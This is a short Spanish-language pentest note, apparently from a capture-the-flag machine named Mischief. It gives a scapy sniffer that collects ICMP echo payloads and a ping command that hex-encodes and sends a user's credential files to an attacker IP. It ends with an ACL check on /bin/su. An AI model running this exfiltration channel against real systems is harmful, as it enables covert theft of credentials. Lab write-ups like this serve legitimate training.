# EXTRA

## Exfiltración de datos por ICMP

### Sniffer

```python
#!/usr/bin/python3

from scapy.all import *
import sys, signal

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
interface = 'tun0'

def data_parser(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].type == 8:
            data = packet[ICMP].load[-4:].decode("utf-8")
            print(data, flush=True, end='')
    

if __name__ == '__main__': # xxd -p -c 4 /etc/hosts | while read i; do echo $i | xxd -ps -r; done

    sniff(iface=interface, prn=data_parser)
```

### Comando a ejecutar

```null
command=xxd -p -c 4 /home/loki/cred* | while read i; do ping -c 1 -p $i 10.10.16.2; done
```

## Obtención ACLs

```null
loki@Mischief:~$ getfacl /bin/su 
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```